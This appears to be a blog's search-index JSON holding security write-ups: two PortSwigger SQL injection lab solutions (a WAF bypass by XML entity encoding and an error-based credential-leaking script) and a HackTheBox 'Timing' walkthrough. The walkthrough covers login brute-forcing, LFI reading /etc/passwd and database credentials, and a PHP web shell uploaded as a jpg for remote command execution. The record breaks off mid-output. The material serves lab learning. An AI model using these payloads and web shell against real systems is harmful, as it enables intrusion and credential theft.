[
  
  {
    "title": "SQL injection with filter bypass via XML encoding",
    "url": "/posts/SQL-injection-with-filter-bypass-via-XML-encoding/",
    "categories": "PortSwigger, SQL-Injection, XML, Writeup, Filter Bypass",
    "tags": "PortSwigger, SQL-Injection",
    "date": "2024-01-04 00:00:00 +0100",
    





    
    "snippet": "üî¨ LAB:This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application‚Äôs response, so you can use a UNION attack to retrieve da...",
    "content": "üî¨ LAB:This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application‚Äôs response, so you can use a UNION attack to retrieve data from other tables.The database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user‚Äôs credentials, then log in to their account.üêß HINTS:A web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack. You‚Äôll need to find a way to obfuscate your malicious query to bypass this filter. We recommend using the Hackvertor extension to do this.üí° SOLUTION:With HTML Entity Encoder / Decoder we can encode our payload to bypass the WAF.Payload:UNION SELECT username || '~' || password FROM usersPOST request:POST /product/stock HTTP/2Host: 0a0900320483449a909e56d6006e00ee.web-security-academy.netCookie: session=r0FXrBxFVQgwscKUTvq1p2nvvn70y827Content-Length: 418Sec-Ch-Ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\"Sec-Ch-Ua-Platform: \"Linux\"Sec-Ch-Ua-Mobile: ?0User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36Content-Type: application/xmlAccept: */*Origin: https://0a0900320483449a909e56d6006e00ee.web-security-academy.netSec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: https://0a0900320483449a909e56d6006e00ee.web-security-academy.net/product?productId=1Accept-Encoding: gzip, deflate, brAccept-Language: en-US,en;q=0.9Priority: u=1, i&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1 &amp;#x55;&amp;#x4E;&amp;#x49;&amp;#x4F;&amp;#x4E;&amp;#x20;&amp;#x53;&amp;#x45;&amp;#x4C;&amp;#x45;&amp;#x43;&amp;#x54;&amp;#x20;&amp;#x75;&amp;#x73;&amp;#x65;&amp;#x72;&amp;#x6E;&amp;#x61;&amp;#x6D;&amp;#x65;&amp;#x20;&amp;#x7C;&amp;#x7C;&amp;#x20;&amp;#x27;&amp;#x7E;&amp;#x27;&amp;#x20;&amp;#x7C;&amp;#x7C;&amp;#x20;&amp;#x70;&amp;#x61;&amp;#x73;&amp;#x73;&amp;#x77;&amp;#x6F;&amp;#x72;&amp;#x64;&amp;#x20;&amp;#x46;&amp;#x52;&amp;#x4F;&amp;#x4D;&amp;#x20;&amp;#x75;&amp;#x73;&amp;#x65;&amp;#x72;&amp;#x73;&lt;/storeId&gt;&lt;/stockCheck&gt;"
  },
  
  {
    "title": "Visible error-based SQL injection",
    "url": "/posts/visible-error-based-sql-injection/",
    "categories": "PortSwigger, SQL-Injection, Blind, Writeup",
    "tags": "PortSwigger, SQL-Injection",
    "date": "2023-12-30 00:00:00 +0100",
    





    
    "snippet": "üî¨ LAB:This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of th...",
    "content": "üî¨ LAB:This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account.üí° SOLUTION:import reimport requestsimport hashlibfrom bs4 import BeautifulSoup# Session IDsid = \"0a03004c03ef203580e34e40009e00f3\"# URL to send GET request tourl = f\"https://{sid}.web-security-academy.net\"print(f\"URL: {url}\")response_body_md5 = \"\"response_body_md5_new = \"\"# Payloads dictionary to be used in the SQL injectionpayloads = {    \"username\": \"' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--\", # Adapt your generic SELECT statement so that it retrieves usernames from the database    \"password\": \"' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--\" # Adapt your generic SELECT statement so that it retrieves passwords from the database}try:    # First request to get the original response    response = requests.get(url)    response.raise_for_status()  # Raise an exception for bad responses (4xx or 5xx)    # Get response body md5 sum    response_body_md5 = hashlib.md5(response.text.encode()).hexdigest()    # print(f\"Original Response body md5 sum: {response_body_md5}\")    # Search for the specific \"Set-Cookie\" header    tracking_cookie = response.headers.get(\"Set-Cookie\")    if tracking_cookie:        # Extract the \"TrackingId\" value from the \"Set-Cookie\" header        tracking_id = tracking_cookie.split(\"=\")[1].split(\";\")[0]        # Extract the \"session\" value from the \"Set-Cookie\" header        session = tracking_cookie.split(\"=\")[2].split(\";\")[0]    # print(\"Response Headers:\")    # for header, value in response.headers.items():    #     print(f\"{header}: {value}\")    # Start loop in payloads dictionary    for key, value in payloads.items():        # Modify the tracking_id by adding the following payload:        # 1. SELECT username FROM users LIMIT 1        # 2. SELECT password FROM users LIMIT 1        print(f\"Modifying tracking_id with payload: {value}\")        modified_tracking_id = f\"{value}\"        # Resend the request with the modified headers        headers = {            'Host': f\"{sid}.web-security-academy.net\",            'Cookie': f'TrackingId={modified_tracking_id}; session={session}',            'Cache-Control': 'max-age=0',            'Sec-Ch-Ua': '\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\"',            'Sec-Ch-Ua-Mobile': '?0',            'Sec-Ch-Ua-Platform': '\"Linux\"',            'Upgrade-Insecure-Requests': '1',            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36',            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',            'Sec-Fetch-Site': 'none',            'Sec-Fetch-Mode': 'navigate',            'Sec-Fetch-User': '?1',            'Sec-Fetch-Dest': 'document',            'Accept-Encoding': 'gzip, deflate, br',            'Accept-Language': 'en-US,en;q=0.9',            'Priority': 'u=0, i'        }        # Sending modified request        response_new = requests.get(url, headers=headers)        # Use BeautifulSoup to parse the HTML content        soup = BeautifulSoup(response_new.text, 'html.parser')        # Find and print the error line        error_line = soup.find('h4').text        match = re.search(r'\"([^\"]*)\"', error_line)        if match:            extracted_text = match.group(1)            print(f\"{key}: {extracted_text}\")        else:            print(f\"No match found in Error Line {key}\")    # Compare the MD5 sums    if response_body_md5 == response_body_md5_new:        print(\"Response bodies are the same.\")    else:        print(\"Response bodies are different.\")except requests.exceptions.RequestException as e:    print(f\"Error: {e}\")"
  },
  
  {
    "title": "HTB Timing Writeup",
    "url": "/posts/Timing/",
    "categories": "HackTheBox, Writeup, Medium",
    "tags": "Writeup, HTB-Medium",
    "date": "2022-03-18 17:00:00 +0100",
    





    
    "snippet": "INFOMachine IP = 10.10.11.135OS       = LinuxLevel    = MEDIUMPoints   = 30Write the IP of the machine to your /etc/hosts fileecho \"x.x.x.x xxx.htb\" &gt;&gt; /etc/hostsSCANNING- Nmap:‚îå‚îÄ‚îÄ(kali„âøkali)...",
    "content": "INFOMachine IP = 10.10.11.135OS       = LinuxLevel    = MEDIUMPoints   = 30Write the IP of the machine to your /etc/hosts fileecho \"x.x.x.x xxx.htb\" &gt;&gt; /etc/hostsSCANNING- Nmap:‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop]‚îî‚îÄ$ sudo nmap -sC -sV -oA nmap/timing/result 10.10.11.135Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-17 14:43 EDTNmap scan report for 10.10.11.135Host is up (0.30s latency).Not shown: 998 closed tcp ports (reset)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)                                                                         |_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)                                                                       80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))                                                                                     |_http-server-header: Apache/2.4.29 (Ubuntu)                                                                                            | http-title: Simple WebApp                                                                                                             |_Requested resource was ./login.php                                                                                                    | http-cookie-flags:                                                                                                                    |   /:                                                                                                                                  |     PHPSESSID:                                                                                                                        |_      httponly flag not set                                                                                                           Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                                                                                                                         Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                          Nmap done: 1 IP address (1 host up) scanned in 32.42 seconds ENUMERATION- Ports:PORT      STATE    SERVICE       VERSION22/tcp    open     ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)80/tcp    open     http          Apache httpd 2.4.29 ((Ubuntu))Port: 80A simple login page there‚Äôs a two scenario by brute-forcing this login page or pass this step with the next one but let‚Äôs play around brute-forcing login page through writing a python script.This script do attack by username same as password# ========================== #url = 'http://10.10.11.135/login.php?login=true'headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0'}proxies = {\"http\": \"http://127.0.0.1:8080\", \"https\": \"http://127.0.0.1:8080\"}# Get users and passwordsUPL = open(\"/usr/share/wordlists/rockyou.txt\", \"r\") # UserName and PassWord listpayload = {    'user':'',    'password':''    }for username in UPL:    sleep(3)    counter_value += 1    # print(counter_value, '-&gt;', payload, end='\\r')    payload['user'] = username.strip('\\n')    payload['password'] = username.strip('\\n')    response = requests.request(\"POST\", url, headers=headers, data=payload, verify=False)    if not response.cookies:        print(payload)        break    else:        print(counter_value, end='\\r')# ========================== #And after waiting we got UserName and PassWord (‚Äòaa‚Äô, ‚Äòaa‚Äô) (&gt;‚Äø‚ó†)This line if you want to use proxy# response = requests.request(\"POST\", url, headers=headers, data=payload, proxies=proxies, verify=False)Or we can do same thing with Burp suite through send request to intruder then add positions, payloads and start attack.But let‚Äôs try another thing.- Gobuster:Before we start with Gobuster let‚Äôs do it in our way by writing our special script :)# ========================== #from requests_toolbelt import threaded# dir_list = open(\"/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\", \"r\")dir_list = open(\"/home/kali/Desktop/time/dirlist\", \"r\")url = 'http://10.10.11.135/'for d in dir_list:    sleep(2)    counter_value += 1    d = d.strip('\\n')    host = [{        'url': url + d,        'method': 'GET',    }]    responses, errors = threaded.map(host)    for response in responses:        if response.response.status_code != 404:            print(host[0]['url'], response.response.status_code, response.response.url)# ========================== #And we got these results:http://10.10.11.135/footer.php 200 http://10.10.11.135/footer.phphttp://10.10.11.135/upload.php 200 http://10.10.11.135/login.phphttp://10.10.11.135/css 403 http://10.10.11.135/css/http://10.10.11.135/js 403 http://10.10.11.135/js/http://10.10.11.135/logout.php 200 http://10.10.11.135/login.phphttp://10.10.11.135/login.php 200 http://10.10.11.135/login.phphttp://10.10.11.135/profile.php 200 http://10.10.11.135/login.phphttp://10.10.11.135/image.php 200 http://10.10.11.135/image.phphttp://10.10.11.135/header.php 200 http://10.10.11.135/login.phphttp://10.10.11.135/images 403 http://10.10.11.135/images/  ...Hmm, all pages took as to login.php except [image.php, images] before continuing let‚Äôs do Gobuster.gobuster dir -u http://10.10.11.135/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80 -x php  -o gobuster.log===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://10.10.11.135/[+] Method:                  GET[+] Threads:                 80[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.1.0[+] Extensions:              php[+] Timeout:                 10s===============================================================2022/03/19 13:00:51 Starting gobuster in directory enumeration mode===============================================================/index.php            (Status: 302) [Size: 0] [--&gt; ./login.php]/login.php            (Status: 200) [Size: 5609]               /images               (Status: 301) [Size: 313] [--&gt; http://10.10.11.135/images/]/image.php            (Status: 200) [Size: 0]                                    /header.php           (Status: 302) [Size: 0] [--&gt; ./login.php]                  /profile.php          (Status: 302) [Size: 0] [--&gt; ./login.php]                  /footer.php           (Status: 200) [Size: 3937]                                 /upload.php           (Status: 302) [Size: 0] [--&gt; ./login.php]                  /css                  (Status: 301) [Size: 310] [--&gt; http://10.10.11.135/css/]   /js                   (Status: 301) [Size: 309] [--&gt; http://10.10.11.135/js/]    /logout.php           (Status: 302) [Size: 0] [--&gt; ./login.php]   ...And we came up with the same results with our preview python script.But the image.php don‚Äôt give any error or redirect. I think this page accept some parameters like GET or POST.Let‚Äôs find the parameters with wfuzz or maybe write our script too :).- wfuzz:wfuzz -u http://10.10.11.135/image.php?FUZZ=/etc/passwd -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt -t 50 --hh 0********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://10.10.11.135/image.php?FUZZ=/etc/passwdTotal requests: 2588=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                   =====================================================================000000360:   200        0 L      3 W        25 Ch       \"img\"                                                                                     Total time: 20.44444Processed Requests: 2588Filtered Requests: 2587Requests/sec.: 126.5869So we see here the only parameter is [img] let‚Äôs check if it vulnerable with [LFI].curl http://10.10.11.135/image.php?img=/etc/passwdHacking attempt detected! And it‚Äôs said hacking attempt detected!, NiceLet‚Äôs try with PHP base64 filter to check the results if it‚Äôs the same or not.curl http://10.10.11.135/image.php?img=php://filter/convert.base64-decoder/resource=/etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologinsyslog:x:102:106::/home/syslog:/usr/sbin/nologinmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin_apt:x:104:65534::/nonexistent:/usr/sbin/nologinlxd:x:105:65534::/var/lib/lxd/:/bin/falseuuidd:x:106:110::/run/uuidd:/usr/sbin/nologindnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologinpollinate:x:109:1::/var/cache/pollinate:/bin/falsesshd:x:110:65534::/run/sshd:/usr/sbin/nologinmysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/falseaaron:x:1000:1000:aaron:/home/aaron:/bin/bash                                              and Bingo! we got the passwd file contentNote: we got aaron user inside /etc/passwd file the same user from our brute-forcing step.By using LFI to check login.php source codecurl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=login.php | base64 -dwe can found there‚Äôs db_conn.php fileinclude \"db_conn.php\";let‚Äôs check this file too with LFIcurl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=db_conn.php | base64 -dhere‚Äôs the results&lt;?php$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');But these information useless for login, HmmmLet‚Äôs move to another file like upload.php we got it earler from our script or Gobuster result.curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=upload.php | base64 -dand here we got a new file:&lt;?phpinclude(\"admin_auth_check.php\");curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=admin_auth_check.php | base64 -d&lt;?phpinclude_once \"auth_check.php\";if (!isset($_SESSION['role']) || $_SESSION['role'] != 1) {    echo \"No permission to access this panel!\";    header('Location: ./index.php');    die();}?&gt;It‚Äôs checking that if our session role id is equal to 1 or not if not it‚Äôs redirect to index.php.And I tried aaron user with login page it‚Äôs worked.but it‚Äôs said user 2 but we need our role id = 1 for that we need to find a way let‚Äôs check the edit profile tab.Okay, Let‚Äôs check the source code of profile.php with that LFI.curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=profile.php | base64 -dthis line looks like another key&lt;script src=\"js/profile.js\"&gt;&lt;/script&gt;curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=js/profile.js | base64 -dfunction updateProfile() {    var xml = new XMLHttpRequest();    xml.onreadystatechange = function () {        if (xml.readyState == 4 &amp;&amp; xml.status == 200) {            document.getElementById(\"alert-profile-update\").style.display = \"block\"        }    };    xml.open(\"POST\", \"profile_update.php\", true);    xml.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");    xml.send(\"firstName=\" + document.getElementById(\"firstName\").value + \"&amp;lastName=\" + document.getElementById(\"lastName\").value + \"&amp;email=\" + document.getElementById(\"email\").value + \"&amp;company=\" + document.getElementById(\"company\").value);}So profile.php sending the form data to profile_update.php.curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=profile_update.php | base64 -d&lt;?phpinclude \"auth_check.php\";$error = \"\";if (empty($_POST['firstName'])) {    $error = 'First Name is required.';} else if (empty($_POST['lastName'])) {    $error = 'Last Name is required.';} else if (empty($_POST['email'])) {    $error = 'Email is required.';} else if (empty($_POST['company'])) {    $error = 'Company is required.';}if (!empty($error)) {    die(\"Error updating profile, reason: \" . $error);} else {    include \"db_conn.php\";    $id = $_SESSION['userid'];    $statement = $pdo-&gt;prepare(\"SELECT * FROM users WHERE id = :id\");    $result = $statement-&gt;execute(array('id' =&gt; $id));    $user = $statement-&gt;fetch();    if ($user !== false) {        ini_set('display_errors', '1');        ini_set('display_startup_errors', '1');        error_reporting(E_ALL);        $firstName = $_POST['firstName'];        $lastName = $_POST['lastName'];        $email = $_POST['email'];        $company = $_POST['company'];        $role = $user['role'];        if (isset($_POST['role'])) {            $role = $_POST['role'];            $_SESSION['role'] = $role;        }        // dont persist role        $sql = \"UPDATE users SET firstName='$firstName', lastName='$lastName', email='$email', company='$company' WHERE id=$id\";        $stmt = $pdo-&gt;prepare($sql);        $stmt-&gt;execute();        $statement = $pdo-&gt;prepare(\"SELECT * FROM users WHERE id = :id\");        $result = $statement-&gt;execute(array('id' =&gt; $id));        $user = $statement-&gt;fetch();        // but return it to avoid confusion        $user['role'] = $role;        $user['6'] = $role;        echo json_encode($user, JSON_PRETTY_PRINT);    } else {        echo \"No user with this id was found.\";    }}?&gt;By checking the profile_update.php file, if we set role=1 in the profile update form. it‚Äôs set the session role id=1.Time to write our tools:at first let‚Äôs write image url genartor:#!/usr/bin/python3import hashlibimport osimport timeimport requestsdef main():    # we can upload avatar image, By checking the source code of upload.php:    # 1. it checks if it is jpg or not    # 2. it creates a file name with an md5 hash    # 3. inside the md5 function it's using $file_hash which is interpreted as a string because it's using a single cot rather than a double cot you can read about that more in the article    # 4. but the time function returns dynamic value    # 5. and then the file_name\t# ‚ùØ php -a\t# Interactive mode enabled\t# php &gt; while(true){echo date(\"G:i:s\"); echo \" = \"; echo md5('$file_hash' . time()); echo \"\\n\";\t# sleep(1);}    OUTPUT_DIR = os.path.dirname(os.path.abspath(__file__))    url = 'http://localhost'    # f = open(os.path.join(OUTPUT_DIR, 'backdoor.jpg'),\"rb\")    # bytes = f.read() # read entire file as bytes    # readable_hash = hashlib.sha256(bytes).hexdigest()    # print(readable_hash)    while True:        hash = f\"{hashlib.md5('$file_hash'.encode()+str(int(time.time())).encode()).hexdigest()}\"        r = requests.get(f'{url}/image.php?img=images/uploads/{hash}_pp.jpg&amp;cmd=id').text        if len(r) &gt; 0:            print(hash)            print(r)            break        time.sleep(1)if __name__ == '__main__':    main()and keep it runnug while we going to run this one for uploud the file please follow comment to understad what‚Äôs going on#!/usr/bin/python3import osfrom time import sleepimport requestsdef main():    url = 'http://localhost/login.php?login=true'    headers = {        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',        'Content-type': 'application/x-www-form-urlencoded',        }    proxies = {\"http\": \"http://127.0.0.1:8080\", \"https\": \"http://127.0.0.1:8080\"}    payload = {        'user':'aaron',        'password':'aaron'        }    session = requests.session()    session.request(\"POST\", url, headers=headers, data=payload, verify=False) # add proxies=proxies if you using proxy    cookie = {'PHPSESSID': requests.utils.dict_from_cookiejar(session.cookies)['PHPSESSID']}    # print(cookie)    # to print the HTML page content and the importent part is:    # &lt;ul class=\"nav navbar-nav\"&gt;    #     &lt;li&gt;&lt;a href=\"index.php\"&gt;Home&lt;/a&gt;&lt;/li&gt;    #     &lt;li class=\"\"&gt;&lt;a href=\"profile.php\"&gt;Edit profile&lt;/a&gt;&lt;/li&gt;    # &lt;/ul&gt;    # purl = 'http://localhost/profile.php'    # response = session.request(\"GET\", purl, headers=headers, verify=False)    # print(response.text)    # to print the HTML page content to get this form:            #     &lt;form class=\"form-horizontal\" role=\"form\" id=\"editForm\" action=\"#\" method=\"POST\"&gt;            # &lt;div class=\"form-group\"&gt;            #     &lt;label class=\"col-lg-3 control-label\"&gt;First name:&lt;/label&gt;            #     &lt;div class=\"col-lg-8\"&gt;            #         &lt;input class=\"form-control\" type=\"text\" name=\"firstName\" id=\"firstName\"            #                value=\"ireally\"&gt;            #     &lt;/div&gt;            # &lt;/div&gt;            # &lt;div class=\"form-group\"&gt;            #     &lt;label class=\"col-lg-3 control-label\"&gt;Last name:&lt;/label&gt;            #     &lt;div class=\"col-lg-8\"&gt;            #         &lt;input class=\"form-control\" type=\"text\" name=\"lastName\" id=\"lastName\"            #                value=\"dontunderstand\"&gt;            #     &lt;/div&gt;            # &lt;/div&gt;            # &lt;div class=\"form-group\"&gt;            #     &lt;label class=\"col-lg-3 control-label\"&gt;Company:&lt;/label&gt;            #     &lt;div class=\"col-lg-8\"&gt;            #         &lt;input class=\"form-control\" type=\"text\" name=\"company\" id=\"company\"            #                value=\"almostnoghingtest\"&gt;            #     &lt;/div&gt;            # &lt;/div&gt;            # &lt;div class=\"form-group\"&gt;            #     &lt;label class=\"col-lg-3 control-label\"&gt;Email:&lt;/label&gt;            #     &lt;div class=\"col-lg-8\"&gt;            #         &lt;input class=\"form-control\" type=\"text\" name=\"email\" id=\"email\"            #                value=\"testmymail\"&gt;            #     &lt;/div&gt;            # &lt;/div&gt;    #Create a new custome payload to change the role=1    data = {        'firstName':'admin',        'lastName':'admin',        'email':'admin',        'company':'admin',        'role':1,        }    # data = 'firstName=admin&amp;lastName=admin&amp;email=admin&amp;company=admin&amp;role=1'    url = 'http://localhost/profile_update.php'    session.post(url, headers = headers, data=data, verify=False, allow_redirects=True) # add proxies=proxies if you using proxy    response = session.get('http://localhost/profile.php', headers=headers, verify=False)    # print(response.text)    # here we got a new link named Admin panel    # &lt;ul class=\"nav navbar-nav\"&gt;    #     &lt;li&gt;&lt;a href=\"index.php\"&gt;Home&lt;/a&gt;&lt;/li&gt;    #     &lt;li class=\"\"&gt;&lt;a href=\"profile.php\"&gt;Edit profile&lt;/a&gt;&lt;/li&gt;    #     &lt;li&gt;&lt;a href=\"avatar_uploader.php\"&gt;Admin panel&lt;/a&gt;&lt;/li&gt;    # &lt;/ul&gt;    # we can upload avatar image, By checking the source code of upload.php:    # 1. it checks if it is jpg or not    # 2. it creates a file name with an md5 hash    # 3. inside the md5 function it's using $file_hash which is interpreted as a string because it's using a single cot rather than a double cot you can read about that more in the article    # 4. but the time function returns dynamic value    # 5. and then the file_name    # Create a jpg file that has PHP code inside that.    OUTPUT_DIR = os.path.dirname(os.path.abspath(__file__))    jpg_file = open(os.path.join(OUTPUT_DIR, 'backdoor.jpg'), 'w')    jpg_file.write(\"jpg89a; &lt;?php system($_GET['cmd']); ?&gt;\")    jpg_file.close()        url = 'http://localhost/upload.php'    # Uploud the jpg file    with open(os.path.join(OUTPUT_DIR, \"backdoor.jpg\"), 'rb') as img:        name_img= os.path.basename(\"backdoor.jpg\")        files= {'fileToUpload': (name_img,img,'multipart/form-data',{'Expires': '0'}) }        r = session.post(url, files=files)        print(r.text)if __name__ == '__main__':    main()As I said I wrote some explanation in comment inside the script, then we got our picture uploaded with name 42723189e466277a63b6e2d7076de2e5_ppand from our python script we got the RCE as shown below:‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop/time]‚îî‚îÄ$ /bin/python3.10 /home/kali/Desktop/time/img_url.py...curl 'http://10.10.11.135/image.php?img=images/uploads/024cbc1d39c970484d4a6ded14b0dc19_pp.jpg&amp;cmd=id'uid=33(www-data) gid=33(www-data) groups=33(www-data)...Now let‚Äôs run ls commandcurl 'http://10.10.11.135/image.php?img=images/uploads/42723189e466277a63b6e2d7076de2e5_pp.jpg&amp;cmd=ls'                                                                                                                                    ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop/time]‚îî‚îÄ$ curl 'http://10.10.11.135/image.php?img=images/uploads/42723189e466277a63b6e2d7076de2e5_pp.jpg&amp;cmd=id'curl 'http://10.10.11.135/image.php?img=images/uploads/42723189e466277a63b6e2d7076de2e5_pp.jpg&amp;cmd=ls'admin_auth_check.phpauth_check.phpavatar_uploader.phpcssdb_conn.phpfooter.phpheader.phpimage.phpimagesindex.phpjslogin.phplogout.phpprofile.phpprofile_update.phpupload.phpAfter a few search we found:‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop/time]‚îî‚îÄ$ curl 'http://10.10.11.135/image.php?img=images/uploads/42723189e466277a63b6e2d7076de2e5_pp.jpg&amp;cmd=id'curl 'http://10.10.11.135/image.php?img=images/uploads/42723189e466277a63b6e2d7076de2e5_pp.jpg&amp;cmd=ls+/opt/'source-files-backup.ziplet‚Äôs copy it to /var/www/html‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop/time]‚îî‚îÄ$ curl 'http://10.10.11.135/image.php?img=images/uploads/42723189e466277a63b6e2d7076de2e5_pp.jpg&amp;cmd=id'curl 'http://10.10.11.135/image.php?img=images/uploads/42723189e466277a63b6e2d7076de2e5_pp.jpg&amp;cmd=cp+/opt/source-files-backup.zip+/var/www/html'and download and unzipunzip source-files-backup.zip we got a the same password insid db_conn.php with LFI&lt;?php$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');we see there .git directory let‚Äôs dump all commits in the background.with this tool we going to dump all commitshttps://github.com/internetwache/GitTools‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Downloads/backup]‚îî‚îÄ$ ./GitTools/Extractor/extractor.sh . .############ Extractor is part of https://github.com/internetwache/GitTools## Developed and maintained by @gehaxelt from @internetwache## Use at your own risk. Usage might be illegal in certain circumstances. # Only for educational purposes!###########[+] Found commit: 16de2698b5b122c93461298eab730d00273bd83e[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/admin_auth_check.php[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/auth_check.php[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/avatar_uploader.php[+] Found folder: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/css[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/css/bootstrap.min.css[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/css/login.css[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/db_conn.php[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/footer.php[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/header.php[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/image.php[+] Found folder: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/images[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/images/background.jpg[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/images/user-icon.png[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/index.php[+] Found folder: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/js[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/js/avatar_uploader.js[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/js/bootstrap.min.js[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/js/jquery.min.js[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/js/profile.js[+] Found file: 